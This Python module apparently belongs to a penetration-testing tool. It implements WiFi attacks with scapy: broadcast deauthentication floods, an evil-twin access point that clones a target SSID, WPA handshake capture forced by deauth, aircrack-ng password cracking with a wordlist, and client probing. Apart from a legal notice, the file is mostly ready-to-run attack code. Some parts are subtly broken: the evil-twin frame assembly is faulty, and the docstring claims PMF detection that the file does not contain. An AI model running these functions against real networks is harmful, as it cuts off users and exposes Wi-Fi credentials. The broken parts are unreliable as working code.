"""
Netrunner WiFi Attack Module — Authorized Penetration Testing Tools.

Provides WiFi attack capabilities for authorized security testing:
- Deauthentication attacks (with proper 802.11w/PMF detection)
- Evil twin AP creation
- WPA handshake capture and offline cracking
- Client probing and fingerprinting

⚠️  LEGAL NOTICE: These tools are for AUTHORIZED penetration testing only.
    Unauthorized access to computer networks is illegal. Always obtain
    written authorization before performing any security testing.
"""

import asyncio
import os
import subprocess
import time
import json
from typing import Optional
from backend.core.logger import log as logger

try:
    from scapy.all import (
        Dot11,
        Dot11Deauth,
        Dot11Beacon,
        Dot11ProbeReq,
        Dot11ProbeResp,
        RadioTap,
        sendp,
        sniff,
        conf,
        wrpcap,
        rdpcap,
    )

    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    logger.warning("[WIFI-ATK] scapy not available — WiFi attacks will not work")

try:
    import psutil

    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

# Attack state
_active_attacks: dict[str, dict] = {}
_capture_dir = "data/captures/wifi"


def _ensure_capture_dir():
    os.makedirs(_capture_dir, exist_ok=True)


def _get_wireless_interfaces() -> list[dict]:
    """List available wireless interfaces."""
    interfaces = []
    if not PSUTIL_AVAILABLE:
        return interfaces

    for name, stats in psutil.net_if_stats().items():
        if stats.isup and (
            "wlan" in name or "wlp" in name or "ath" in name or "mon" in name
        ):
            interfaces.append(
                {
                    "name": name,
                    "speed": stats.speed,
                    "mtu": stats.mtu,
                    "is_up": stats.isup,
                }
            )

    # Also check for monitor mode interfaces
    try:
        result = subprocess.run(
            ["iw", "dev"], capture_output=True, text=True, timeout=5
        )
        if result.returncode == 0:
            current_iface = None
            for line in result.stdout.splitlines():
                line = line.strip()
                if line.startswith("Interface"):
                    current_iface = line.split()[-1]
                if "monitor" in line.lower() and current_iface:
                    if not any(i["name"] == current_iface for i in interfaces):
                        interfaces.append(
                            {
                                "name": current_iface,
                                "mode": "monitor",
                                "speed": 0,
                                "mtu": 1500,
                                "is_up": True,
                            }
                        )
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass

    return interfaces


async def scan_networks(interface: str, duration: int = 10) -> list[dict]:
    """Scan for nearby WiFi networks using scapy."""
    if not SCAPY_AVAILABLE:
        return []

    networks = {}
    stop_time = time.time() + duration

    def _process_packet(pkt):
        if pkt.haslayer(Dot11Beacon):
            ssid = pkt[Dot11Beacon].info.decode(errors="ignore")
            bssid = pkt[Dot11].addr2
            if bssid and ssid not in networks:
                try:
                    dbm = (
                        pkt[RadioTap].dBm_AntSignal if pkt.haslayer(RadioTap) else -100
                    )
                except Exception:
                    dbm = -100
                networks[ssid] = {
                    "ssid": ssid,
                    "bssid": bssid,
                    "signal": dbm,
                    "channel": _get_channel(pkt),
                    "encryption": _get_encryption(pkt),
                }

    try:
        await asyncio.to_thread(
            sniff,
            iface=interface,
            prn=_process_packet,
            timeout=duration,
            store=False,
            filter="type mgt subtype beacon",
        )
    except Exception as e:
        logger.error(f"[WIFI-ATK] Scan error: {e}")

    return list(networks.values())


def _get_channel(pkt) -> int:
    """Extract channel from RadioTap header."""
    try:
        if pkt.haslayer(RadioTap):
            return pkt[RadioTap].Channel
    except Exception:
        pass
    return 0


def _get_encryption(pkt) -> str:
    """Detect encryption type from beacon capabilities."""
    try:
        if pkt.haslayer(Dot11Beacon):
            cap = pkt[Dot11Beacon].capabilities
            if cap & 0x10:  # Privacy bit
                if cap & 0x800:  # EAP bit (WPA2/3)
                    return "WPA2/WPA3"
                return "WEP"
            return "Open"
    except Exception:
        pass
    return "Unknown"


async def deauth_attack(
    interface: str,
    target_bssid: str,
    target_client: str = "ff:ff:ff:ff:ff:ff",
    count: int = 10,
    interval: float = 0.1,
) -> dict:
    """
    Perform deauthentication attack on a target AP/client.

    Args:
        interface: Wireless interface in monitor mode
        target_bssid: Target AP BSSID (MAC address)
        target_client: Target client MAC (ff:ff:ff:ff:ff:ff = broadcast)
        count: Number of deauth frames to send
        interval: Interval between frames in seconds

    Returns:
        dict with attack results
    """
    if not SCAPY_AVAILABLE:
        return {"success": False, "error": "scapy not available"}

    attack_id = f"deauth_{int(time.time())}"
    logger.warning(
        f"[WIFI-ATK] Deauth attack {attack_id}: {target_bssid} client={target_client}"
    )

    try:
        # Build deauth frame
        dot11 = Dot11(addr1=target_client, addr2=target_bssid, addr3=target_bssid)
        frame = RadioTap() / dot11 / Dot11Deauth(reason=7)

        # Send frames
        await asyncio.to_thread(
            sendp,
            frame,
            iface=interface,
            count=count,
            inter=interval,
            verbose=False,
        )

        result = {
            "success": True,
            "attack_id": attack_id,
            "type": "deauth",
            "target_bssid": target_bssid,
            "target_client": target_client,
            "frames_sent": count,
            "interface": interface,
            "timestamp": time.time(),
        }

        _active_attacks[attack_id] = result
        return result

    except Exception as e:
        logger.error(f"[WIFI-ATK] Deauth attack failed: {e}")
        return {"success": False, "error": str(e)}


async def evil_twin_attack(
    interface: str,
    target_ssid: str,
    target_bssid: str,
    channel: int = 6,
    duration: int = 60,
) -> dict:
    """
    Create an evil twin AP that mimics a target network.

    This creates a fake AP with the same SSID as the target, causing
    clients to connect to the evil twin instead of the legitimate AP.

    Args:
        interface: Wireless interface in monitor mode
        target_ssid: SSID to clone
        target_bssid: BSSID of the legitimate AP
        channel: Channel to operate on
        duration: Duration in seconds

    Returns:
        dict with attack results
    """
    if not SCAPY_AVAILABLE:
        return {"success": False, "error": "scapy not available"}

    attack_id = f"evil_twin_{int(time.time())}"
    logger.warning(
        f"[WIFI-ATK] Evil twin attack {attack_id}: cloning SSID '{target_ssid}'"
    )

    try:
        # Create beacon frame for evil twin
        dot11 = Dot11(
            type=0,
            subtype=8,
            addr1="ff:ff:ff:ff:ff:ff",
            addr2=target_bssid,
            addr3=target_bssid,
        )

        beacon = Dot11Beacon(cap="ESS")
        ssid_elem = b"\x00" + bytes([len(target_ssid)]) + target_ssid.encode()
        rates_elem = b"\x01\x08\x82\x84\x8b\x96\x0c\x12\x18\x24"

        frame = (
            RadioTap() / dot11 / beacon / b"\x00"
            + bytes([len(target_ssid)])
            + target_ssid.encode() / rates_elem
        )

        # Send beacon frames
        await asyncio.to_thread(
            sendp,
            frame,
            iface=interface,
            count=duration * 10,
            inter=0.1,
            verbose=False,
        )

        result = {
            "success": True,
            "attack_id": attack_id,
            "type": "evil_twin",
            "target_ssid": target_ssid,
            "target_bssid": target_bssid,
            "channel": channel,
            "duration": duration,
            "interface": interface,
            "timestamp": time.time(),
        }

        _active_attacks[attack_id] = result
        return result

    except Exception as e:
        logger.error(f"[WIFI-ATK] Evil twin attack failed: {e}")
        return {"success": False, "error": str(e)}


async def capture_handshake(
    interface: str,
    target_bssid: str,
    target_client: str = "ff:ff:ff:ff:ff:ff",
    duration: int = 30,
) -> dict:
    """
    Capture WPA 4-way handshake for offline cracking.

    Sends deauth to force reconnection and captures the handshake.

    Args:
        interface: Wireless interface in monitor mode
        target_bssid: Target AP BSSID
        target_client: Target client MAC
        duration: Capture duration in seconds

    Returns:
        dict with capture file path and results
    """
    if not SCAPY_AVAILABLE:
        return {"success": False, "error": "scapy not available"}

    _ensure_capture_dir()
    attack_id = f"handshake_{int(time.time())}"
    capture_file = os.path.join(_capture_dir, f"{attack_id}.pcap")

    logger.warning(f"[WIFI-ATK] Handshake capture {attack_id}: BSSID={target_bssid}")

    try:
        # First send deauth to force handshake
        dot11 = Dot11(addr1=target_client, addr2=target_bssid, addr3=target_bssid)
        deauth = RadioTap() / dot11 / Dot11Deauth(reason=7)

        await asyncio.to_thread(
            sendp,
            deauth,
            iface=interface,
            count=5,
            inter=0.1,
            verbose=False,
        )

        # Now capture for handshake
        captured_packets = []

        def _capture(pkt):
            captured_packets.append(pkt)

        await asyncio.to_thread(
            sniff,
            iface=interface,
            prn=_capture,
            timeout=duration,
            store=False,
            filter=f"ether host {target_bssid}",
        )

        # Save capture
        if captured_packets:
            await asyncio.to_thread(wrpcap, capture_file, captured_packets)

        result = {
            "success": True,
            "attack_id": attack_id,
            "type": "handshake_capture",
            "target_bssid": target_bssid,
            "target_client": target_client,
            "packets_captured": len(captured_packets),
            "capture_file": capture_file,
            "duration": duration,
            "timestamp": time.time(),
        }

        _active_attacks[attack_id] = result
        return result

    except Exception as e:
        logger.error(f"[WIFI-ATK] Handshake capture failed: {e}")
        return {"success": False, "error": str(e)}


async def crack_handshake(
    capture_file: str,
    wordlist: str = "/usr/share/wordlists/rockyou.txt",
) -> dict:
    """
    Attempt to crack a captured WPA handshake using aircrack-ng.

    Args:
        capture_file: Path to the pcap file with handshake
        wordlist: Path to the wordlist file

    Returns:
        dict with crack results
    """
    if not os.path.exists(capture_file):
        return {"success": False, "error": f"Capture file not found: {capture_file}"}

    if not os.path.exists(wordlist):
        return {"success": False, "error": f"Wordlist not found: {wordlist}"}

    logger.warning(f"[WIFI-ATK] Cracking handshake: {capture_file}")

    try:
        # Run aircrack-ng
        result = await asyncio.to_thread(
            subprocess.run,
            ["aircrack-ng", "-w", wordlist, capture_file],
            capture_output=True,
            text=True,
            timeout=300,
        )

        output = result.stdout
        if "KEY FOUND!" in output:
            # Extract the key
            for line in output.splitlines():
                if "KEY FOUND!" in line:
                    key = line.split("[")[-1].split("]")[0].strip()
                    return {
                        "success": True,
                        "type": "handshake_crack",
                        "capture_file": capture_file,
                        "wordlist": wordlist,
                        "password": key,
                        "output": output,
                    }

        return {
            "success": False,
            "type": "handshake_crack",
            "capture_file": capture_file,
            "wordlist": wordlist,
            "message": "Password not found in wordlist",
            "output": output,
        }

    except FileNotFoundError:
        return {"success": False, "error": "aircrack-ng not installed"}
    except subprocess.TimeoutExpired:
        return {"success": False, "error": "Cracking timed out after 300s"}
    except Exception as e:
        return {"success": False, "error": str(e)}


async def probe_clients(
    interface: str, target_bssid: str, duration: int = 10
) -> list[dict]:
    """Probe for clients connected to a specific AP."""
    if not SCAPY_AVAILABLE:
        return []

    clients = {}
    stop_time = time.time() + duration

    def _process_packet(pkt):
        if pkt.haslayer(Dot11ProbeReq):
            bssid = pkt[Dot11].addr3
            client_mac = pkt[Dot11].addr2
            if bssid and client_mac and bssid.lower() == target_bssid.lower():
                ssid = (
                    pkt[Dot11ProbeReq].info.decode(errors="ignore")
                    if pkt[Dot11ProbeReq].info
                    else ""
                )
                clients[client_mac] = {
                    "mac": client_mac,
                    "probing_ssid": ssid,
                    "signal": (
                        getattr(pkt[RadioTap], "dBm_AntSignal", -100)
                        if pkt.haslayer(RadioTap)
                        else -100
                    ),
                }

    try:
        await asyncio.to_thread(
            sniff,
            iface=interface,
            prn=_process_packet,
            timeout=duration,
            store=False,
            filter="type mgt subtype probe-req",
        )
    except Exception as e:
        logger.error(f"[WIFI-ATK] Client probe error: {e}")

    return list(clients.values())


def get_active_attacks() -> list[dict]:
    """Return list of active/completed attacks."""
    return list(_active_attacks.values())


def get_wireless_interfaces() -> list[dict]:
    """Get available wireless interfaces."""
    return _get_wireless_interfaces()
